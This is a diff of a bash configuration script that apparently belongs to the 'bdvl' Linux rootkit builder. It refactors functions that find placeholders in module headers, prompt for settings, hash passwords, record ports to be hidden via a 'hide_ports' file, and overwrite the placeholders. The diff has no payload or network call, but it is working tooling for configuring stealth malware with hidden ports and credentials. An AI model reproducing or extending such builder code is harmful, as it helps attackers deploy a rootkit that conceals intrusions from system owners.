@@ -1,24 +1,37 @@
 find_var_placeholders(){ # $1 = header paths
     local headers current_var \
-          header_path header_vars \
-          vars
+          header_vars vars toggle_name
 
     headers=($1)
 
-    for w in ${headers[@]}; do
-        header_path=$w
-        header_vars=("`cat $header_path | grep '??'`")
+    for header in ${headers[@]}; do
+        # read variable placeholders from within $header
+        header_vars="`cat $header | grep '??'`"
 
-        for var in ${header_vars[@]}; do
-            current_var=`echo $var | grep "??"`
+        while read -r line; do
+            # we don't do empty lines
+            [ -z "$line" ] && continue
+
+            # name of variable placeholder
+            current_var="`echo -n "$line" | awk -F" " '{print $3}'`"
             [ -z $current_var ] && continue
+
+            # if the variable placeholder's relative toggle
+            # is disabled, don't bother fetching it.
+            toggle_name="`get_toggle_name "$line"`"
+            [ "`toggle_enabled $toggle_name`" == "false" ] && continue
+
+            # add the variable placeholder's name to our list
+            # so we can overwrite it very shortly.
             vars+=($current_var)
-        done
+        done <<< "$header_vars"
     done
 
     echo -n "${vars[*]}"
 }
 
+# for every variable placeholder, we need
+# some kind of input for it, do that here.
 get_setting(){ # $1 = var
     local var name \
           input is_string
@@ -46,6 +59,8 @@ get_setting(){ # $1 = var
         input="`crypt_password $input`" # if the variable is intended to be a password,
                                         # make sure it's hashed before writing it anywhere
 
+    # this bit here used to xor the input, if it's a string.
+    # now just encapsulate it in quotation marks.
     [ $is_string == 1 ] && input="\"$input\""
 
     echo -n "$input:$var"
@@ -66,12 +81,12 @@ overwrite_placeholder(){
     for header in ${headers[@]}; do sed -i "s:${var_name}:${var_value}:" $header; done
 }
 
-populate_new_placeholders(){
+setup_configuration(){
     cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory"; exit; }
 
     echo && secho "Beginning configuration...\n"
 
-    necho "Getting hooks & writing the function name arrays"
+    necho "Getting hooks"
     write_hooks >> $BDVL_H
 
     local var_placeholders settings index headers
@@ -79,7 +94,7 @@ populate_new_placeholders(){
     necho "Finding header paths"
     headers=(`find_header_paths`)
 
-    necho "Getting variable placeholders and their new values\n"
+    necho "Preparing your settings\n"
     var_placeholders=(`find_var_placeholders "${headers[*]}"`)
     for i in ${!var_placeholders[@]}; do
         local current_var="${var_placeholders[$i]}"
@@ -90,14 +105,13 @@ populate_new_placeholders(){
         # write it to the 'hide_ports' file.
         [ `toggle_enabled HIDE_PORTS` == "false" ] && continue  # don't if we don't need to
         IFS=':' read -r curvar_val curvar_name <<< "${settings[$i]}"
-        [[ "$curvar_name" == *"PORT"* ]] && \
-            add_hiddenport $curvar_name $curvar_val
+        [[ "$curvar_name" == *"PORT"* ]] && add_hiddenport $curvar_name $curvar_val
     done
 
     secho "These are your defined/generated settings:"
     output_creds
 
-    necho "Overwriting old variable placeholders with new settings"
+    necho "Overwriting old variable placeholders"
     for selem in ${settings[@]}; do overwrite_placeholder "$selem" "${headers[*]}"; done
 
     if [ $DOCOMPRESS == 1 ]; then
